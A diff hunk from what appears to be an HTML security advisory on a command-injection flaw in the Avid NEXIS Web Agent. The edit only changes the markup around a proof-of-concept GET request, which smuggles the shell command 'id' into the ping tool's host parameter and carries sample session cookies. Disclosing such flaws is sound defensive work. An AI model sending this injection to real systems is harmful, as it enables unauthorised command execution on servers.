@@ -146,7 +146,7 @@ The Avid NEXIS Web Agent allows an authenticated user to execute system function
 
 <p>The vulnerability can be triggered with the following GET request:</p>
 
-<pre><code class="language-http">GET /agent?r=tools&amp;type=ping&amp;host=127.0.0.1;id HTTP/1.1
+<p><code class="language-http">GET /agent?r=tools&amp;type=ping&amp;host=127.0.0.1;id HTTP/1.1
 Host: 192.168.40.141:5015
 Cookie: avidagent=12345; userveragenttoken=3543434935133395140
 Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
@@ -162,7 +162,7 @@ Accept-Encoding: gzip, deflate, br
 Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
 Priority: u=1
 Connection: close
-</code></pre>
+</code></p>
 
 <p>The response looks like this (stripped):</p>
 
